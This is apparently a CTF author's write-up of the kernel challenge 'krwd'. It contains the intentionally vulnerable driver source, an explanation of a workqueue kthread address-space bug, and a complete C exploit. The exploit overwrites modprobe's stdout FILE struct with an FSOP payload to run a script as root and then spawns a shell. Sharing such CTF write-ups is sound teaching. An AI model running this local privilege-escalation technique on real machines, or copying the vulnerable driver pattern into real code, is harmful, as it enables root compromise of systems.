+++
title = 'krwd - TRX CTF Quals 2026'
date = 2026-04-25T22:41:16+02:00
draft = false
author = 'prosti'
summary = 'kernel pwn challenge that I wrote for TRX CTF 2026'
tags = [
    'linux'
]
toc = true
+++

## Description
> *The solution to all your problems is right here -> https://kqx.io*
## Source code
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/mutex.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/jiffies.h>

MODULE_LICENSE("GPL");

#define CHALL_DEVICE_NAME           "chall"
#define CHALL_DEVICE_CLASS_NAME     "chall_class"

/* IOCTL command definitions */
#define IOCTL_CHALL_MAGIC               'E'
#define IOCTL_CHALL_ADD_REQUEST         _IOW(IOCTL_CHALL_MAGIC, 0, struct urequest *)
#define IOCTL_CHALL_SET_WORK            _IOW(IOCTL_CHALL_MAGIC, 3, struct urequest *)

#define CHALL_KBUF_SIZE                 0x0400
#define CHALL_KBUFS_MAX_SIZE            0x0050
#define CHALL_KREQUESTS_MAX_SIZE        0x0020


static int                        chall_major;
static struct class              *chall_dev_class  = NULL;
static struct device             *chall_dev        = NULL;

static int     chall_open(struct inode *inodep, struct file *filep);
static int     chall_release(struct inode *inodep, struct file *filep);
static long    chall_ioctl(struct file *filep, unsigned int cmd, unsigned long arg);

static DEFINE_MUTEX(chall_ctx_mutex);

static const struct file_operations chall_fops = {
    .open           = chall_open,
    .release        = chall_release,
    .unlocked_ioctl = chall_ioctl,
};


enum krequest_type {
    TYPE_READ,      
    TYPE_WRITE,
    TYPE_DELETE,
    TYPE_SET_WORK       
};

enum krequest_status {
    REQ_FREE,
    REQ_PENDING
};

union request_info {
    struct {
        size_t size;
        char* __user ubuf;
        size_t kbuf_idx;
    } rw;
        
    struct {
        size_t kbuf_idx;
    } delete;

    struct {
        size_t kreq_idx;
        unsigned long time;
    } work;
};

struct krequest {
    pid_t pid;
    uid_t uid;
    gid_t gid;
    enum krequest_type type;
    enum krequest_status status;
    union request_info info;
    struct delayed_work dwork;
};

struct urequest {
    enum krequest_type type;
    union request_info info;
    size_t req_idx;
};

enum kbuf_status {
    KBUF_FREE,
    KBUF_IN_USE
};

struct kbuf {
    pid_t pid;
    uid_t uid;
    gid_t gid;
    enum kbuf_status status;
    char buf[CHALL_KBUF_SIZE];
};

static struct krequest krequests[CHALL_KREQUESTS_MAX_SIZE] = {0};
static struct kbuf kbufs[CHALL_KBUFS_MAX_SIZE] = {0};

static long check_perms(struct krequest* kreq){
    size_t kbuf_idx;

    
    switch (kreq->type){
    case TYPE_READ:
    case TYPE_WRITE:
    case TYPE_DELETE:
        kbuf_idx = (kreq->type == TYPE_DELETE)? kreq->info.delete.kbuf_idx : kreq->info.rw.kbuf_idx;

        if(kbuf_idx >= CHALL_KBUFS_MAX_SIZE)
            return -EINVAL;

            
        if (kbufs[kbuf_idx].status == KBUF_FREE)
            return 0;

        if(kreq->uid == 0 && kreq->gid == 0)
            return 0;

        if (kbufs[kbuf_idx].uid != kreq->uid ||
            kbufs[kbuf_idx].gid != kreq->gid ||
            kbufs[kbuf_idx].pid != kreq->pid)
            return -EPERM;
        break;
    default:
        return -EINVAL;
    }

    return 0;
}

static void request_handler(struct work_struct* work)
{
    /* Get the request */
    struct krequest* kreq;
    struct kbuf* kbuf;
    size_t kbuf_idx;

    mutex_lock(&chall_ctx_mutex);

    kreq = container_of(work, struct krequest, dwork.work);

    if(check_perms(kreq) != 0)
        goto handler_exit;

    kbuf_idx = (kreq->type == TYPE_DELETE)? kreq->info.delete.kbuf_idx : kreq->info.rw.kbuf_idx;
    
    kbuf = &kbufs[kbuf_idx];

    if(kbuf->status == KBUF_FREE) {
        kbuf->status = KBUF_IN_USE;
        kbuf->uid = kreq->uid;
        kbuf->gid = kreq->gid;
        kbuf->pid = kreq->pid;
    }

    switch (kreq->type) {
    case TYPE_READ:
        if(copy_to_user(kreq->info.rw.ubuf, kbuf->buf, (kreq->info.rw.size < CHALL_KBUF_SIZE)? kreq->info.rw.size : CHALL_KBUF_SIZE))
            goto handler_exit;
        break;
    case TYPE_WRITE:
        if(copy_from_user(kbuf->buf, kreq->info.rw.ubuf, (kreq->info.rw.size < CHALL_KBUF_SIZE)? kreq->info.rw.size : CHALL_KBUF_SIZE))
            goto handler_exit;
        break;
    case TYPE_DELETE:
        kbuf->status = KBUF_FREE;
        break;
    default:
        break;
    }

handler_exit:
    mutex_unlock(&chall_ctx_mutex);
    kreq->status = REQ_FREE;
}

static long request_add(struct urequest* ureq)
{
    long fidx, i;
    
    for (i = 0, fidx = -1; i < CHALL_KREQUESTS_MAX_SIZE; ++i) {
        if (krequests[i].status == REQ_FREE){
            fidx = i;
            break;
        }
    }

    if(fidx == -1)
        return fidx;
    
    switch (ureq->type) {
    case TYPE_READ:
    case TYPE_WRITE:
    case TYPE_DELETE:
        krequests[fidx].uid = from_kuid(current_user_ns(), current_uid());
        krequests[fidx].gid = from_kgid(current_user_ns(), current_gid());
        krequests[fidx].pid = task_pid_nr(current);
        krequests[fidx].type = ureq->type;
        krequests[fidx].status = REQ_PENDING;
        krequests[fidx].info = ureq->info;
        break;
    default:
        return -1;
    }

    ureq->req_idx = fidx;

    return 0;
}

static long chall_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
{
    struct urequest ureq;
    long r = 0;

    mutex_lock(&chall_ctx_mutex);

    if (copy_from_user(&ureq, (struct urequest *)arg, sizeof(struct urequest)) != 0){
        r = -EFAULT;
        goto ioctl_exit;
    }
    
    switch (cmd) {
    case IOCTL_CHALL_ADD_REQUEST:
        if (request_add(&ureq) != 0){
            r = -ENOSPC;
            goto ioctl_exit;
        }
        
        if (copy_to_user((struct urequest * )arg, &ureq, sizeof(struct urequest)) != 0){
            r = -EFAULT;
            goto ioctl_exit;
        }

        break;
    case IOCTL_CHALL_SET_WORK:
        if (ureq.type != TYPE_SET_WORK || ureq.info.work.kreq_idx >= CHALL_KREQUESTS_MAX_SIZE){
            r = -EINVAL;
            goto ioctl_exit;
        }        
        /* Set async work*/
        INIT_DELAYED_WORK(&krequests[ureq.info.work.kreq_idx].dwork, request_handler);
        schedule_delayed_work(&krequests[ureq.info.work.kreq_idx].dwork, msecs_to_jiffies(ureq.info.work.time));
        break;
    default:
        r = -EINVAL;
    }

ioctl_exit:
    mutex_unlock(&chall_ctx_mutex);
    return r;
}

static int __init chall_init(void)
{
    unsigned long i;

    printk(KERN_INFO "chall: Initializing driver\n");

    chall_major = register_chrdev(0, CHALL_DEVICE_NAME, &chall_fops);
    if (chall_major < 0) {
        printk(KERN_ALERT "chall: Failed to register char device (%d)\n", chall_major);
        return chall_major;
    }
    printk(KERN_INFO "chall: Registered with major number %d\n", chall_major);

    chall_dev_class = class_create(CHALL_DEVICE_CLASS_NAME);

    if (IS_ERR(chall_dev_class)) {
        unregister_chrdev(chall_major, CHALL_DEVICE_NAME);
        printk(KERN_ALERT "chall: Failed to create device class\n");
        return PTR_ERR(chall_dev_class);
    }
    printk(KERN_INFO "chall: Device class created\n");

    chall_dev = device_create(chall_dev_class, NULL, MKDEV(chall_major, 0), NULL, CHALL_DEVICE_NAME);
    if (IS_ERR(chall_dev)) {
        class_destroy(chall_dev_class);
        unregister_chrdev(chall_major, CHALL_DEVICE_NAME);
        printk(KERN_ALERT "chall: Failed to create device\n");
        return PTR_ERR(chall_dev);
    }
    printk(KERN_INFO "chall: Device ready\n");

    for (i = 0; i < CHALL_KREQUESTS_MAX_SIZE; ++i)
        krequests[i].status = REQ_FREE;

    for (i = 0; i < CHALL_KBUFS_MAX_SIZE; ++i)
        kbufs[i].status = KBUF_FREE;
    
    return 0;
}

static void __exit chall_exit(void)
{
    device_destroy(chall_dev_class, MKDEV(chall_major, 0));
    class_unregister(chall_dev_class);
    class_destroy(chall_dev_class);
    unregister_chrdev(chall_major, CHALL_DEVICE_NAME);
    printk(KERN_INFO "chall: Driver unloaded\n");
}

static int chall_open(struct inode *inodep, struct file *filep)
{
    
    printk(KERN_INFO "chall: Device opened\n");
    return 0;
}

static int chall_release(struct inode *inodep, struct file *filep)
{   
    printk(KERN_INFO "chall: Device closed\n");
    return 0;
}

module_init(chall_init);
module_exit(chall_exit);

```

## Brief overview of the module
The module allows users to read and write, to and from, kernel-space buffers (`kbufs`). The module then executes krequests to use these buffers asynchronously by using work queues.

The user can create four types of krequests:
1. `TYPE_READ`     
2. `TYPE_WRITE`
3. `TYPE_DELETE`
4. `TYPE_SET_WORK` 

`TYPE_READ` and `TYPE_WRITE` are used to asynchronously read from and write to a kernel buffer using a given user-space address.
`TYPE_SET_WORK` schedules asynchronous work by specifying the ID of a previously registered request and the delay before execution.

## Spotting the vulnerability
The vulnerability is somewhat tricky to find. There are no BOFs, and everything is protected by a single mutex, so there are (allegedly) no race conditions.

To understand the problem you should ask yourself: "What happens if you use copy_{from,to}_user in a kernel thread?"

A kernel thread does not have its own `mm` (`task->mm = NULL`). Instead, it runs with an `active_mm`, i.e., a borrowed user-space memory context. As a result, operations like `copy_to_user` and `copy_from_user` may execute in the address space of a different process than the one that originally issued the request.

This detail is not clearly documented for kernel threads or workqueues, so understanding it usually requires digging into the kernel source. 

## Exploiting
The objective is to overwrite a privileged process' memory. A good target could be `/sbin/modprobe` and, since the challenge uses busybox, this is just a symlink to the busybox binary.
By default busybox is no-PIE and static, and I have compiled it with symbols too to help players out a bit.
Now the idea is simple: we can overwrite `_IO_2_1_stdout_` file struct and use a (simplified) variation of angry FSOP to execute an arbitrary program as root. You obviously can't just execute `/bin/sh` since when modprobe is running you can't interact with it via standard input and output but you can just execute something like `/tmp/e` where `e` is whatever you want.
Since busybox is static, `__dlopen` is defined and we can bypass the checks on the address of the file's vtable.

```c
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
  PTR_DEMANGLE (flag);
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```

So the steps are:
1. Setup `/tmp/e` with the bash commands that we want to execute as root
2. Submit and execute a lot of write requests to fill all kernel buffers with our FSOP payload
3. Submit a lot of read requests and pass the address of `_IO_2_1_stdout_` as target user space address
4. Set all the works with a bit of delay so that the requests do not get processed immediately
5. Spam `modprobe` and hope that right before the krequests get processed the CPU executes `modprobe`
6. Execute `system("/tmp/e")`

## Flag
`TRX{0h_s0_y0u_d0_und3rst4nd_h0w_kthr34ds_w0rk!_cd454889c85c415b}`

## Exploit

```c
#include "helpers.h"
#include <string.h>

#define IOCTL_CHALL_MAGIC               'E'
#define IOCTL_CHALL_ADD_REQUEST         _IOW(IOCTL_CHALL_MAGIC, 0, struct urequest *)
#define IOCTL_CHALL_SET_WORK            _IOW(IOCTL_CHALL_MAGIC, 3, struct urequest *)

#define DEV "/dev/chall"

#define CHALL_KBUF_SIZE                 0x0400
#define CHALL_KBUFS_SIZE                0x0050
#define CHALL_KREQUESTS_MAX_SIZE        0x0020

#define STDOUT_ADDRESS                  0x657440


/* Driver structs & enums */
enum krequest_type {
    TYPE_READ,      
    TYPE_WRITE,
    TYPE_DELETE,
    TYPE_SET_WORK       
};

enum krequest_status {
    REQ_PENDING,
    REQ_FREE
};

union request_info {
    struct {
        size_t size;
        char* ubuf;
        size_t kbuf_idx;
    } rw;
        
    struct {
        size_t kbuf_idx;
    } delete;

    struct {
        size_t kreq_idx;
        unsigned long time;
    } work;
};


struct urequest {
    enum krequest_type type;
    union request_info info;
    size_t req_idx;
};


__attribute__((constructor))
void init(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    system("rm -f /tmp/e");
    system("echo -ne '#!/bin/sh\ncat /dev/sda > /tmp/flag.txt\n' > /tmp/e");
    system("chmod +x /tmp/e");

    if(getuid() == 0)
        system("/bin/sh");
}


int main(){
    int dev;
    unsigned long fsop_payload[] = {*(unsigned long *)"/tmp/e\0", 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 0ul, 0ul, 0ul, 0ul, 6649376ul, 1ul, 18446744073709551615ul, 0ul, 6681808ul, 18446744073709551615ul, 0ul, 6649120ul, 0ul, 0ul, 0ul, 4294967295ul, 0ul, 0ul, 6649120ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul};
    fsop_payload[5] += 1; // look at _IO_flush_all to understand why we need this lmao

    char* tmp_buf = (char *)STDOUT_ADDRESS;

    hlt("start exploit");

    dev = open(DEV, O_RDWR);
    if(dev < 0)
        err(1, "could not open device");

    // prepare write request
    struct urequest rureq = {
        .type = TYPE_WRITE,
        .info = {
            .rw = {
                .kbuf_idx = 0,
                .size = sizeof(fsop_payload) * sizeof(unsigned long),
                .ubuf = (void *)fsop_payload
            }
        }
    };

    if(ioctl(dev, IOCTL_CHALL_ADD_REQUEST, &rureq) != 0)
        err(1, "ioctl failed");

    // start countdown
    rureq.type = TYPE_SET_WORK;
    rureq.info.work.kreq_idx = rureq.req_idx;
    rureq.info.work.time = 1000; // ns
    
    if(ioctl(dev, IOCTL_CHALL_SET_WORK, &rureq) != 0)
        err(1, "ioctl failed");

    sleep(1);

    for(int i = 0; i < 0x20-1; ++i){
        printf(".");
        // prepare read request
        struct urequest wureq = {
            .type = TYPE_READ,
            .info = {
                .rw = {
                    .kbuf_idx = 0,
                    .size = PAGE_SIZE,
                    .ubuf = tmp_buf
                }
            }
        };

        if(ioctl(dev, IOCTL_CHALL_ADD_REQUEST, &wureq) != 0)
            err(1, "ioctl failed");

        // start countdown
        wureq.type = TYPE_SET_WORK;
        wureq.info.work.kreq_idx = wureq.req_idx;
        wureq.info.work.time = 1000+i*10; // ns
        
        if(ioctl(dev, IOCTL_CHALL_SET_WORK, &wureq) != 0)
            err(1, "ioctl failed");
    }

    puts(INF "starting modprobe trigger");    
    if(fork() != 0){
        sleep(5);
        puts("spawning shell");
        system("/bin/sh");
    }
    else{
        for(;;) socket(22, SOCK_DGRAM, 0);
    }
    close(dev);
    return 0;
}
```

## Notes

I was pretty excited about this challenge. I know that it isn't super hard but I think that the vulnerability is pretty cool. When doing tests before the CTF codex with gpt-5.4 wasn't able to solve it but unfortunately gpt-5.5 was released the day before the CTF and was able to one-shot this challenge (it didn't get a huge amount of solves but still...). I'm not against people using LLMs for CTFs but seeing your challenge getting solved like that is not a great experience. After a bit of thinking I came to the conclusion that I won’t write challenges for LLM-allowed CTFs going forward—it’s just not worth it.

